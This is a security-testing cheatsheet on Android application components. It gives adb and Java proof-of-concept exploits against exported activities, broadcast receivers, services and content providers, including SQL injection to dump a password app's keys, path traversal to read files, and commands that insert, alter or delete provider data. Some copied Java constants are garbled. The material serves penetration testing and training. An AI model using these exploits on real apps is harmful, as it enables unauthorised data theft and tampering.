# Android Application Components Security Cheatsheet

## **Activities**

**Definition**:\
Activities define screens with which users can interact. They can be exported using `android:exported="true"` or implicitly via `intent-filters`.

**Testing**:

1. Check `AndroidManifest.xml` for `android:exported="true"`.
2. Look for `intent-filters` indicating implicit export.
3. Search for sensitive actions or data handled by the activity.

*   Example **AndroidManifest.xml**:

    ```xml
    <activity android:exported="true" android:name=".FileSelectActivity" />
    ```

**Exploit POC**:

1.  **ADB Commands**:

    ```bash
    am start -n <package>/<activity-name>
    am start -n com.mwr.example.sieve/.FileSelectActivity
    ```
2.  **Java Code**:

    ```java
    Intent intent = new Intent();
    intent.setComponent(new ComponentName("com.mwr.example.sieve", ".PWList"));
    startActivity(intent);
    ```

***

## Intents

**Definition**:&#x20;

Intents are messages used to request an action from another app component, such as starting an activity, service, or broadcasting a message. Vulnerabilities arise when exported components handle malicious or unvalidated intents.

**Testing**:

1. Review `AndroidManifest.xml` for exported components with intent-filters.
   * Check for `android:exported="true"`.
   * Look for `<intent-filter>` entries specifying `action` or `category`.
2. Search for intent-handling code using `Intent intent = getIntent()`.
3. Verify whether the component validates the received intent's data or extras.

**Exploit:**

1.  **Triggering with ADB**:\
    Use `am start` to deliver a crafted intent.

    ```bash
    am start -a <action> --es <key> <value>
    ```

    Example:

    ```bash
    am start -a com.apphacking.changePin --es "username" "user"
    ```

    Optionally include the category:

    ```bash
    am start -a com.apphacking.changePin -c android.intent.category.DEFAULT --es "username" "user"
    ```
2.  **Crafting Intents in Java**:

    ```java
    javaCopy codeIntent intent = new Intent();
    intent.setAction("com.apphacking.changePin");
    intent.putExtra("username", "user");
    context.startActivity(intent);
    ```
3.  Example **AndroidManifest.xml**:

    ```xml
    <activity android:name=".ChangePin" android:exported="true">
        <intent-filter>
            <action android:name="com.apphacking.changePin" />
            <category android:name="android.intent.category.DEFAULT" />
        </intent-filter>
    </activity>
    ```
4.  Example Vulnerable Code:

    ```java
    public void changeSettings(View view) {
        Intent intent = new Intent(this, ChangePin.class);
        intent.putExtra("username", username);
        startActivity(intent);
    }
    ```

    If the `ChangePin` activity is exported, it could be triggered by a malicious intent with arbitrary `username`.

***

## **`BroadcastReceivers`**

**Definition**:\
`BroadcastReceivers` respond to broadcast intents, such as system events or app-specific messages. If exported, they might allow malicious intent delivery.

**Testing**:

1. Review `AndroidManifest.xml` for `android:exported="true"`.
2. Inspect the `onReceive` method for sensitive data or actions.
3. Search for dynamically registered receivers in code using `registerReceiver()`.

*   Example **AndroidManifest.xml**:

    ```xml
    <receiver android:exported="true" android:name=".myBroadcastReceiver">
        <intent-filter>
            <action android:name="com.apphacking.broadcastreceiver.alarmState" />
        </intent-filter>
    </receiver>
    ```

**Exploit POC**:

1.  **ADB Commands**:

    ```bash
    am broadcast -a <action-name> --es <key> <value>
    am broadcast -a com.apphacking.broadcastreceiver.alarmState --es "status" "arm"
    ```
2.  **Java Code**:

    ```java
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        txtView = findViewById(R.id.textView);
        imageView = findViewById(R.id.imageView);

        registerReceiver(alarmSystemReceiver, new IntentFilter("com.apphacking.broadcastreceiver.alarmState"));
    }

    private BroadcastReceiver alarmSystemReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String alarmState = "";

            alarmState = intent.getStringExtra("status"); // status

            if (alarmState.equals("arm")) {
                // activate the alarm system
                txtView.setText("armed");
                imageView.setImageResource(R.drawable.lockclosed);
                Log.d("Alarm-State", "Alarm system armed!");
                return;
            }

            if (alarmState.equals("disarm")) {
                // deactivate the alarm system
                txtView.setText("disarmed");
                imageView.setImageResource(R.drawable.lockopen);
                Log.d("Alarm-State", "Alarm system disarmed!");
            }
        }
    };
    ```

***

## **`ContentProviders`**

**Definition**:\
`ContentProviders` handle structured data sharing between applications. They are vulnerable to SQL Injection or Path Traversal if insecurely implemented.

**Testing**:

1. Check `AndroidManifest.xml` for `android:exported="true"`.
2. Review `query`, `insert`, `update`, and `delete` methods for sanitization.
3. Inspect URI handling logic for traversal issues.

*   Example **AndroidManifest.xml**:

    ```xml
    <provider android:exported="true" android:name=".MyContentProvider" />
    ```

**Exploit POC**:

1.  **SQL Injection**:

    ```bash
    content query --uri content://<authority>/Passwords --projection "* FROM Key--"
    ```
2.  **Path Traversal**:

    ```bash
    content read --uri content://<authority>/../../../../etc/hosts
    ```
3.  Example **Java Code**:

    ```java
    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        return db.query("table", projection, selection, selectionArgs, null, null, sortOrder);
    }
    ```

***

## **`Services`**

**Definition**:\
Services run background operations. Exported services can expose sensitive operations to external triggers.

**Testing**:

1. Check `AndroidManifest.xml` for `android:exported="true"`.
2. Review service methods for sensitive actions triggered by incoming intents.

*   Example **AndroidManifest.xml**:

    ```xml
    <service android:exported="true" android:name=".SensitiveService" />
    ```

**Exploit POC**:

1.  **ADB Commands**:

    ```bash
    am startservice -n <package>/<service-name>
    am startservice -n com.example.app/.SensitiveService
    ```

***

## **`ContentProvider`**

**Definition**:\
ContentProviders manage access to a structured set of app data. They are designed for inter-app data sharing. Vulnerabilities arise if exported providers allow unauthorized access, SQL injection, or path traversal attacks.

#### **Testing**

1.  **Check `AndroidManifest.xml`**:

    * Look for `android:exported="true"`.
    * Verify permissions, especially `protectionLevel` values (e.g., `dangerous` or `signature`).\
      Example:

    ```xml
    <provider android:name=".MyContentProvider"
              android:authorities="com.example.app.provider"
              android:exported="true" />
    ```
2.  **Analyze Methods in Java Code**:

    * Inspect `query`, `insert`, `update`, and `delete` for proper input sanitization.
    * Check file-handling methods like `openFile()` for unvalidated URIs.\
      Example Vulnerable Code:

    ```java
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        return db.query("table", projection, selection, selectionArgs, null, null, sortOrder);
    }
    ```
3.  **Identify Table Names**:

    * Search for `content://` references in code to locate tables exposed via the ContentProvider.\
      Example:

    ```java
    public static final Uri KEYS_URI = Uri.parse("content://com.example.provider/Keys");
    public static final Uri PASSWORDS_URI = Uri.parse("content://com.example.provider/Passwords");
    ```

#### **Exploitation POC**

**1. SQL Injection**

If the `query()` method does not sanitize inputs, SQL queries can be manipulated.

* Vulnerable Code

```java
@Override // android.content.ContentProvider
public Cursor query(Uri in, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    int type = this.sUriMatcher.match(in);
    SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
    if (type >= 100 && type < 200) {
        queryBuilder.setTables (PWTable.TABLE_NAME);
    } else if (type >= 200) {
        queryBuilder.setTables (PWTable.KEY_TABLE_NAME);
    } 
    return queryBuilder.query(this.pwdb.getReadableDatabase(), projection, selection, selectionArgs, null, null, sortOrder);
}
```

* The SQL syntax will be generated out of these parameters as follow:

```sql
query (
    Uri,
    projection,
    selection,
    selectionArgs,
    sortOrder
    content://com.example.app/news
    payload
    null,
    null,
    null
)
SELECT projection FROM Uri WHERE selection=selectionArgs ORDER BY sortOrder;
```

* Now we need to identify the tables in the Java code. We can look for the keyword “`content://`“.

```java
// Source: DBContentProvider - Sieve.apk
public static final int KEY = 200;
public static final Uri KEYS_URI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys");
public static final int KEY ID = 230;
public static final int KEY PASSWORD = 210;
public static final int KEY PIN = 220;
public static final int PASSWORDS 100;
public static final int PASSWORDS EMAIL = 140;
public static final int PASSWORDS ID = 110;
public static final int PASSWORDS PASSWORD 150;
public static final int PASSWORDS SERVICE 120;
public static final Uri PASSWORDS_URI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");
```

> The actual table names might be different, we have to track this in the code because within the SQL injection attack, we have to use the correct table names and not the authority names.

*   Example SQL Query Structure:

    ```sql
    SELECT projection FROM Uri WHERE selection=selectionArgs ORDER BY sortOrder;
    ```
*   **Exploit via ADB**:

    ```bash
    content query --uri content://<authority>/Passwords --projection "* FROM Key--"
    ```
*   Example SQL Injection Command:

    ```bash
    content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords --projection "* FROM Key--"
    ```

**2. Path Traversal**

Improper URI validation in methods like `openFile()` allows arbitrary file access.

* AndroidManifest.xml

```xml
<provider
android:name=".MusicFileProvider"
android:authorities="com.apphacking.musicplayer"
android:enabled="true"
android:exported="true"></provider>
```

*   Vulnerable Code Example:

    ```java
    @Override
    public ParcelFileDescriptor openFile(Uri uri, String mode) {
        File file = new File(uri.getPath());
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
    }
    ```
*   **Exploit Path Traversal via ADB**:

    ```bash
    content read --uri content://<authority>/../../../../etc/hosts
    ```
*   Example Path Traversal Command:

    ```bash
    content read --uri content://com.apphacking.musicplayer/../../../../../../etc/hosts
    ```

**3. Manipulating Database**

Bypassing permissions or exploiting exported providers enables unauthorized data manipulation.

*   Example Commands:\
    **Select Data**:

    ```bash
    content query --uri content://<authority>/users
    ```

    **Insert Data**:

    ```bash
    content insert --uri content://<authority>/users --bind name:s:admin
    ```

    **Update Data**:

    {% code overflow="wrap" %}
    ```bash
    content update --uri content://<authority>/users --bind name:s:hacker --where "name='admin'"
    ```
    {% endcode %}

    **Delete Data**:

    ```bash
    content delete --uri content://<authority>/users --where "name='admin'"
    ```
